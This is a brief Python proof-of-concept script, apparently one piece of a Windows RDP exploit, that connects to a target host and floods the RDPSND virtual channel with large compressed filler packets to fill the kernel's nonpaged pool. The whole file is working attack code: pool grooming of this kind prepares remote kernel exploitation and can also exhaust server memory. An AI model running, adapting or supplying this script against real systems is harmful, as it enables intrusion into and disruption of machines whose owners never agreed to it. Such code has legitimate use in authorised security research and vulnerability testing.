#!/usr/bin/env python
'''
PoC for filling kernel nonpaged pool over RDPSND channel.
'''
from myrdp import create_rdp, default_t120_channels
import sys

host = sys.argv[1]

rdp = create_rdp(host, default_t120_channels, req_ssl=True, verbose=False)

rdpsnd_channel_id = rdp.channel_ids[1]
rdpdr_channel_id = rdp.channel_ids[3]
t120_channel_id = rdp.channel_ids[4]

print('connection established. recving data from server')

rdp.start_recv_loop()
# wait for RDPDR to make sure the RDPSND channel is ready
rdp.wait_for_rdpdr_client_id()

chdata = b'A'*8164

print('filling kernel nonpaged pool')
pkt = rdp.create_send_channel_data(rdpsnd_channel_id, chdata, do_compress=True)
#print(len(pkt))
for i in range(900):
    rdp.send(pkt*100)

input("Press Enter to continue...\n")

rdp.disconnect()
